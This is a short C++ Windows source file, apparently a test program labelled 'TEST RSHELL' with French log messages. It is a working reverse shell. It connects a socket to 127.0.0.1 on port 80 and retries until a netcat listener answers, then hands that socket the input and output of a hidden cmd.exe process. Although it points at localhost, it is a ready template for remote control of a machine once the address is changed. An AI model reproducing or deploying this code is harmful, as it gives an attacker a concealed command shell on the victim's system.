#include <winsock2.h>
#include <common/Logger.hpp>
using namespace std;

void RemoteShell()
{
        LOG << "RemoteShell : Started";
        SOCKADDR_IN sAddr;
        PROCESS_INFORMATION pi;
        STARTUPINFO si;

        memset( &si, 0, sizeof( si ) );
        si.cb = sizeof( si );
        si.wShowWindow = SW_HIDE;
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;

        sAddr.sin_addr.s_addr = inet_addr("127.0.0.1");
        sAddr.sin_port =  htons(80);
        sAddr.sin_family = AF_INET;

        SOCKET c = WSASocket( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
		if(c == INVALID_SOCKET)
		{
			LOG << "Impossible d'acquerir un socket pour RemoteShell.";
			return;
		}
        while(connect(c, (LPSOCKADDR)&sAddr, sizeof(sAddr)))
        {
            LOG << "Connexion a echouee.";
            Sleep(100);
        }
		LOG << "Connecte a netcat.";
        si.hStdInput = (HANDLE)c;
        si.hStdOutput = (HANDLE)c;
        si.hStdError = (HANDLE)c;
        if(!CreateProcess( NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi ))
		{
			LOG << "Impossible de demarrer cmd.exe pour RemoteShell.";
		}
		else
		{
			WaitForSingleObject( pi.hProcess, INFINITE );
			CloseHandle( pi.hProcess );
			CloseHandle( pi.hThread );
		}
        closesocket( c );
        LOG << "RemoteShell : Ended";
    }

int main(int argc, char * argv[])
{
	LOG.setHeader("TEST RSHELL");
    LOG.addObserver(new Common::LoggingNetwork("127.0.0.1", 80));
	try
	{
		RemoteShell();
	}
	catch(...)
	{
		LOG << "Erreur d'origine inconnue.";
	}
	return EXIT_SUCCESS;
}
